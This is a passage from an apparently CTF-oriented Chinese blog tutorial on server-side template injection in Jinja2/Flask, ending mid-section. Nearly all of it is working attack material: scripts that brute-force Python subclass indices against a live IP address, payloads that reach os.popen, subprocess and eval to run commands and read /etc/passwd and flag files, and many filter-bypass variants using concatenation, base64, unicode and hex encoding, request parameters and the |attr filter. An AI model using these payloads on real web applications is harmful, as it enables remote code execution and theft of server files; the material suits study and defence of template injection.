<h3 id="寻找-importlib-类执行命令"><a href="#寻找-importlib-类执行命令" class="headerlink" title="寻找 importlib 类执行命令"></a>寻找 importlib 类执行命令</h3><p>Python 中存在 <code>&lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;</code> 类，目的就是提供 Python 中 import 语句的实现（以及 <code>__import__</code> 函数）。那么可以直接利用该类中的<code>load_module</code>将os模块导入，从而使用 os 模块执行命令。</p>
<p>首先编写脚本遍历目标Python环境中 importlib 类的索引号：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    post_url = <span class="string">&#x27;http://124.70.99.199:10086/level/1&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span>: <span class="string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(post_url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(i, <span class="string">&quot;!!!!!!!!!!!!!!!!!!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(i, res.text, res.status_code, <span class="string">&quot;NO&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>构造payload：<code>&#123;&#123;[].__class__.__base__.__subclasses__()[120]["load_module"]("os")["popen"]("ls /").read()&#125;&#125;</code></p>
<h3 id="寻找-linecache-函数执行命令"><a href="#寻找-linecache-函数执行命令" class="headerlink" title="寻找 linecache 函数执行命令"></a>寻找 linecache 函数执行命令</h3><p>linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块，所以可以利用这个 linecache 函数去执行命令。</p>
<p>首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    post_url = <span class="string">&#x27;http://124.70.99.199:10086/level/1&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span>:<span class="string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(post_url, data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;linecache&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(i, <span class="string">&quot;!!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(i, res.text, res.status_code, <span class="string">&quot;NO&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>构造payload：<code>&#123;&#123;[].__class__.__base__.__subclasses__()[284].__init__.__globals__['linecache']['os'].popen('ls /').read()&#125;&#125;</code></p>
<h3 id="寻找-subprocess-Popen-类执行命令"><a href="#寻找-subprocess-Popen-类执行命令" class="headerlink" title="寻找 subprocess.Popen 类执行命令"></a>寻找 subprocess.Popen 类执行命令</h3><p>从python2.4版本开始，可以用 subprocess 这个模块来产生子进程，并连接到子进程的标准输入&#x2F;输出&#x2F;错误中去，还可以得到子进程的返回值。</p>
<p>subprocess 意在替代其他几个老的模块或者函数，比如：<code>os.system</code>、<code>os.popen</code> 等函数。</p>
<p>首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    post_url = <span class="string">&#x27;http://124.70.99.199:10086/level/1&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>,<span class="number">550</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span>:<span class="string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(post_url, data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;subprocess.Popen&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(i, <span class="string">&quot;!!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(i, res.text, res.status_code, <span class="string">&quot;NO&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>构造payload：<code>&#123;&#123;[].__class__.__base__.__subclasses__()[520]('ls /',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</code></p>
<h2 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h2><h3 id="利用字符串拼接绕过"><a href="#利用字符串拼接绕过" class="headerlink" title="利用字符串拼接绕过"></a>利用字符串拼接绕过</h3><p>我们可以利用“**+**”进行字符串拼接，绕过关键字过滤，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&#x27;/fl&#x27;+&#x27;ag&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;o&quot;+&quot;s&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__buil&#x27;+&#x27;tins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>只要返回的是<strong>字典类型</strong>的或是<strong>字符串格式</strong>的，即payload中引号内的，在调用的时候都可以使用字符串拼接绕过。</p>
<h3 id="利用编码绕过"><a href="#利用编码绕过" class="headerlink" title="利用编码绕过"></a>利用编码绕过</h3><p>我们可以利用对关键字编码的方法，绕过关键字过滤，例如用base64编码绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;X19idWlsdGluc19f&#x27;.decode(&#x27;base64&#x27;)][&#x27;ZXZhbA==&#x27;.decode(&#x27;base64&#x27;)](&#x27;X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==&#x27;.decode(&#x27;base64&#x27;))&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>等同于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，在payload中，只要是字符串的，即payload中引号内的，都可以用编码绕过。同理还可以进行rot13、16进制编码等。</p>
<h3 id="利用Unicode编码绕过关键字（flask适用）"><a href="#利用Unicode编码绕过关键字（flask适用）" class="headerlink" title="利用Unicode编码绕过关键字（flask适用）"></a>利用Unicode编码绕过关键字（flask适用）</h3><p>我们可以利用unicode编码的方法，绕过关键字过滤，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;][&#x27;\u0065\u0076\u0061\u006c&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;\u006f\u0073&#x27;].popen(&#x27;\u006c\u0073\u0020\u002f&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>等同于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="利用Hex编码绕过关键字"><a href="#利用Hex编码绕过关键字" class="headerlink" title="利用Hex编码绕过关键字"></a>利用Hex编码绕过关键字</h3><p>和上面那个一样，只不过将Unicode编码换成了Hex编码，适用于<strong>过滤了“u”</strong>的情况。</p>
<p>我们可以利用hex编码的方法，绕过关键字过滤，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;][&#x27;\x65\x76\x61\x6c&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;\x6f\x73&#x27;].popen(&#x27;\x6c\x73\x20\x2f&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>等同于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="利用引号绕过"><a href="#利用引号绕过" class="headerlink" title="利用引号绕过"></a>利用引号绕过</h3><p>我们可以利用引号来绕过对关键字的过滤。例如，过滤了flag，那么我们可以用 <code>fl&quot;&quot;ag</code> 或 <code>fl&#39;&#39;ag</code> 的形式来绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[40](&quot;/fl&quot;&quot;ag&quot;).read()</span><br></pre></td></tr></table></figure>

<p>再如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;o&#x27;&#x27;s&#x27;].popen(&#x27;ls&#x27;).read()</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__buil&#x27;&#x27;tins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，在payload中，只要是字符串的，即payload中引号内的，都可以用引号绕过。</p>
<h3 id="利用join-函数绕过"><a href="#利用join-函数绕过" class="headerlink" title="利用join()函数绕过"></a>利用join()函数绕过</h3><p>我们可以利用join()函数来绕过关键字过滤。例如，题目过滤了flag，那么我们可以用如下方法绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[40](&quot;fla&quot;.join(&quot;/g&quot;)).read()</span><br></pre></td></tr></table></figure>

<h2 id="绕过其他字符"><a href="#绕过其他字符" class="headerlink" title="绕过其他字符"></a>绕过其他字符</h2><h3 id="过滤了中括号"><a href="#过滤了中括号" class="headerlink" title="过滤了中括号[ ]"></a>过滤了中括号[ ]</h3><p><strong>利用 <code>__getitem__()</code> 绕过</strong></p>
<p>可以使用 <code>__getitem__()</code> 方法输出序列属性中的某个索引处的元素，如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[2]</span><br><span class="line">&quot;&quot;.__class__.__mro__.__getitem__(2)</span><br><span class="line">[&#x27;__builtins__&#x27;].__getitem__(&#x27;eval&#x27;)</span><br></pre></td></tr></table></figure>

<p>如下示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(40)(&#x27;/etc/passwd&#x27;).read()&#125;&#125;       // 指定序列属性</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;       // 指定字典属性</span><br></pre></td></tr></table></figure>

<p><strong>利用 pop() 绕过</strong></p>
<p>pop()方法可以返回指定序列属性中的某个索引处的元素或指定字典属性中某个键对应的值，如下示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()&#125;&#125;       // 指定序列属性</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.pop(&#x27;__builtins__&#x27;).pop(&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;       // 指定字典属性</span><br></pre></td></tr></table></figure>

<p>注意：最好不要用pop()，因为pop()会删除相应位置的值。（除非你有相应的权限才可以）</p>
<p><strong>利用字典读取绕过</strong></p>
<p>我们知道访问字典里的值有两种方法，一种是把相应的键放入熟悉的方括号 <code>[]</code> 里来访问，一种就是用点 <code>.</code> 来访问。所以，当方括号 <code>[]</code> 被过滤之后，我们还可以用点 <code>.</code> 的方式来访问，如下示例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// __builtins__.eval()</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>等同于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// [__builtins__][&#x27;eval&#x27;]()</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="过滤了引号"><a href="#过滤了引号" class="headerlink" title="过滤了引号"></a>过滤了引号</h3><p><strong>利用chr()绕过</strong></p>
<p>先获取chr()函数，赋值给chr，后面再拼接成一个字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"># &#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>等同于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>利用request对象绕过</strong></p>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path=/etc/passwd（只能get）</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.values.cmd).read()&#125;&#125;&amp;os=os&amp;cmd=ls /（get/post都可以）</span><br></pre></td></tr></table></figure>

<p>等同于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>如果过滤了args，可以将其中的request.args改为request.values，POST和GET两种方法传递的数据request.values都可以接收</p>
<h3 id="过滤了下划线"><a href="#过滤了下划线" class="headerlink" title="过滤了下划线__"></a>过滤了下划线__</h3><p><strong>利用request对象绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[request.args.class][request.args.bases][0][request.args.subclasses]()[40](&#x27;/flag&#x27;).read()&#125;&#125;&amp;class=__class__&amp;bases=__bases__&amp;subclasses=__subclasses__</span><br><span class="line"></span><br><span class="line">&#123;&#123;()[request.args.class][request.args.bases][0][request.args.subclasses]()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;&amp;class=__class__&amp;bases=__bases__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure>

<p>等同于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>还有一种编码绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__class__ =&gt; \x5f\x5fclass\x5f\x5f</span><br></pre></td></tr></table></figure>

<p>其中<code>_</code>的十六进制编码为<code>\x5f</code>，于是我们可以构造出如下的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[154].__init__.__globals__[&#x27;popen&#x27;](&quot;ls /&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(&quot;\x5f\x5fclass\x5f\x5f&quot;)|attr(&quot;\x5f\x5fbase\x5f\x5f&quot;)|attr(&quot;\x5f\x5fsubclasses\x5f\x5f&quot;)()|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(154)|attr(&quot;\x5f\x5finit\x5f\x5f&quot;)|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&#x27;popen&#x27;)(&quot;ls /&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="过滤了点"><a href="#过滤了点" class="headerlink" title="过滤了点 ."></a>过滤了点 .</h3><p><strong>利用 <code>|attr()</code> 绕过（适用于flask）</strong></p>
<p>如果 <code>.</code> 也被过滤，且目标是JinJa2（flask）的话，可以使用原生JinJa2函数<code>attr()</code>，即：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__   =&gt;  ()|attr(&quot;__class__&quot;)</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(77)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls /&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>等同于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>利用中括号[ ]绕过</strong></p>
<p>如下示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__bases__&#x27;][0][&#x27;__subclasses__&#x27;]()[59][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>等同于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__.[0].__subclasses__().[59].__init__[&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;].eval(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>这样的话，那么 <code>__class__</code>、<code>__bases__</code> 等关键字就成了字符串，就都可以用前面所讲的关键字绕过的姿势进行绕过了。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[158].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;()[&#x27;__class__&#x27;][&#x27;__bases__&#x27;][0][&#x27;__subclasses__&#x27;][158][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;)[popen(&quot;ls /&quot;)][read()]&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="过滤了大括号"><a href="#过滤了大括号" class="headerlink" title="过滤了大括号"></a>过滤了大括号</h3><p>可以使用 <code>&#123;% if ... %&#125;1&#123;% endif %&#125;</code> 配合 <code>os.popen</code> 和 <code>curl</code> 将执行结果外带（不外带的话无回显）出来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;ls /&#x27;) %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>也可以用 <code>&#123;%print(......)%&#125;</code> 的形式来代替大括号，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(&#x27;&#x27;.__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read())%&#125;</span><br></pre></td></tr></table></figure>

<h2 id="利用-attr-来Bypass"><a href="#利用-attr-来Bypass" class="headerlink" title="利用 |attr() 来Bypass"></a>利用 <code>|attr()</code> 来Bypass</h2><p>这里说一个新东西，就是原生JinJa2函数 <code>attr()</code>，这是一个 <code>attr()</code> 过滤器，它只查找属性，获取并返回对象的属性的值，过滤器与变量用管道符号（ <code>|</code> ）分割。如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo|attr(&quot;bar&quot;)   等同于   foo[&quot;bar&quot;]</span><br></pre></td></tr></table></figure>

<p><code>|attr()</code> 配合其他姿势可同时绕过双下划线 <code>__</code> 、引号、点 <code>.</code> 和 <code>[</code> 等，下面给出示例。</p>
<h3 id="同时过滤了-和"><a href="#同时过滤了-和" class="headerlink" title="同时过滤了 . 和 []"></a>同时过滤了 . 和 []</h3><p>过滤了以下字符：<code>.    [</code></p>
<p>绕过姿势：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(77)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>等同于：</p>
